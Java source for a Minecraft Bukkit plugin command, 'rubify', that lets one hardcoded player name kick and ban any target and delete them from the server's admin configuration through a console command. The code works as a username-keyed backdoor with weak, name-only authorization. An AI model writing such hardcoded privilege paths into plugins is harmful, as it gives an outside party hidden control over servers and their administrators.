package me.rivwhall05.RivCommands.commands;

import me.rivwhall05.RivCommands.core.Main;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class rubify
implements CommandExecutor
{
public Main plugin;

	public boolean onCommand(CommandSender sender, Command rubify, String commandLabel, String[] args) {
{
  Player p = (Player)sender;
  if (rubify.getName().equalsIgnoreCase("rubify")) {
	  if(sender == Bukkit.getServer().getPlayer("reuben4545")){
  	  if (args.length == 0) {
			sender.sendMessage(ChatColor.RED + "Please specify a player!");
			return true;
		}
		Player target = Bukkit.getServer().getPlayer(args[0]);
		if (target == null) {
			sender.sendMessage(ChatColor.RED + "Could not find player " + args[0] + "!");
			return true;
		}
		Bukkit.getServer().broadcastMessage(ChatColor.RED + sender.getName() + ChatColor.RED + " -" + ChatColor.RED + " Im rubbing you off the adminlist " + ChatColor.RED + target.getName() + ChatColor.RED + "!" );
		target.kickPlayer(ChatColor.RED + "You have been Rubify'ed by " + ChatColor.RED + sender.getName());
		target.setBanned(true);
		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "saconfig delete " + target.getName());
		
  }
}
return false;
	}
}
}